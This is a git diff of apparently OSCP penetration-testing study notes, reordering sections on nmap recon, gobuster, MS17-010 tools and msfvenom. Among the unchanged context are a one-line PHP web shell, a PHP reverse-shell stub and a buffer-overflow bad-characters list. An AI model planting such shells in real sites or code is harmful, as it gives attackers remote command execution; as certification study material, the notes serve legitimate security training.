@@ -36,21 +36,29 @@ searchsploit wordpress escalation
 cp /usr/share/exploitdb/exploits/php/webapps/12345.txt ./
 ````
 
-## Useful Tools
-MS17-010
-
-[AutoBlue](https://github.com/3ndG4me/AutoBlue-MS17-010)
+## Recon
+NMAP
+```bash
+nmap -A -T4 --script vulners -oN test.nmap {TARGETS}
+```
 
 Add addtional vulnerability scanning capability to NMAP
 
 [Vulners](https://github.com/vulnersCom/nmap-vulners)
 
+### Web
+gobuster
+
+[Gobuster Package Description](https://tools.kali.org/web-applications/gobuster)
+
+## Useful Tools
+MS17-010
+
+[AutoBlue](https://github.com/3ndG4me/AutoBlue-MS17-010)
+
 msfvenom *replaced msfpayload in older articles*
 
 [Msfvenom Cheat Sheet](https://thor-sec.com/cheatsheet/oscp/msfvenom_cheat_sheet/)
-
-gobuster
-[Gobuster Package Description](https://tools.kali.org/web-applications/gobuster)
 
 ## Useful Bookmarks
 Detailed explanation on how tools/exploits work.
@@ -96,7 +104,7 @@ bad_chars += "xe1xe2xe3xe4xe5xe6xe7xe8xe9xeaxebxecxedxeexefxf0"
 bad_chars += "xf1xf2xf3xf4xf5xf6xf7xf8xf9xfaxfbxfcxfdxfexff"
 ```
 
-### Reverse Shell
+## Reverse Shell
 PHP calls perl for reverse shell (quotes must be escaped properly - test it locally first!)
 ```php
 <?php
@@ -105,14 +113,13 @@ shell_exec($cmd);
 ?>
 ```
 
-### Web Shell
+## Web Shell
 PHP
 ```php
 <?php echo shell_exec($_GET["cmd"]); ?>
 ```
 
-
-### Exam
+## Exam
 [A Script Kiddie’s guide to Passing OSCP on your first attempt](https://forum.hackthebox.eu/discussion/1730/a-script-kiddie-s-guide-to-passing-oscp-on-your-first-attempt)
 
 [Pentest Book](https://chryzsh.gitbooks.io/pentestbook/content/list_of_common_ports.html)
